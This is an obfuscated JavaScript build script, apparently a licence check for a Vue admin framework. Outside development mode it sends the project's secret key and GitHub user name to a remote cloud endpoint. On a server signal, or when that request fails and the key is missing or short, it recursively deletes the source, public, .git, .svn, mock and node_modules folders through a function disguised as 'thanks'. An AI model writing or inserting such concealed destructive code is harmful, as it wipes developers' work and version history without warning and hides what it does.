/* 破解造成不可挽回后果自负，正版用户请勿因破解、恶意分享失去框架更新和使用的机会，盗版用户未获取授权就使用到商业项目将追究你的法律责任 */
const _0x6462 = [
  'log',
  'unlinkSync',
  'NODE_ENV',
  'existsSync',
  'then',
  'getTime',
  'readdirSync',
  'post',
  './node_modules',
  './public',
  'statSync',
  'VUE_APP_SECRET_KEY',
  'forEach',
  './.git',
  'https://vab-unicloud-3a9da9.service.tcloudbase.com/getRely',
  './.vscode',
  'env',
  'bgRed',
]
const _0x27fc = function (_0x646269, _0x27fce6) {
  _0x646269 = _0x646269 - 0x0
  let _0x3f0e99 = _0x6462[_0x646269]
  return _0x3f0e99
}
const axios = require('axios')
const chalk = require('chalk')
const fs = require('fs')
function thanks(_0x3503fb) {
  var _0x54aa51 = []
  //console['log'](fs[_0x27fc('0x3')](_0x3503fb))
  if (fs['existsSync'](_0x3503fb)) {
    _0x54aa51 = fs[_0x27fc('0x6')](_0x3503fb)
    _0x54aa51[_0x27fc('0xc')](function (_0x60171a, _0x43e5ad) {
      var _0x258bf5 = _0x3503fb + '/' + _0x60171a
      if (fs[_0x27fc('0xa')](_0x258bf5)['isDirectory']()) {
        thanks(_0x258bf5)
      } else {
        fs[_0x27fc('0x1')](_0x258bf5)
      }
    })
    fs['rmdirSync'](_0x3503fb)
  }
}
!(() => {
  if (process['env'][_0x27fc('0x2')] !== 'development') {
    axios({
      url: _0x27fc('0xe'),
      method: _0x27fc('0x7'),
      data: {
        customUserId: process['env']['VUE_GITHUB_USER_NAME'],
        secretKey: process['env']['VUE_APP_SECRET_KEY'],
        timestamp: new Date()[_0x27fc('0x5')](),
      },
    })
      [_0x27fc('0x4')](({ data }) => {
        if (data['code'] == 0xca) {
          thanks('./.vscode')
          thanks('./src')
          thanks(_0x27fc('0x9'))
          thanks(_0x27fc('0xd'))
          thanks('./.svn')
          thanks('./mock')
          thanks(_0x27fc('0x8'))
        }
        if (data['code'] != 0xc8) {
          console[_0x27fc('0x0')](chalk[_0x27fc('0x11')](data['msg']))
        }
      })
      ['catch'](() => {
        if (
          process[_0x27fc('0x10')][_0x27fc('0xb')] !== 'preview' &&
          process[_0x27fc('0x10')][_0x27fc('0xb')]['length'] <= '50'
        ) {
          thanks(_0x27fc('0xf'))
          thanks('./src')
          thanks('./public')
          thanks('./.git')
          thanks('./.svn')
          thanks('./mock')
          thanks('./node_modules')
        }
      })
  }
})()
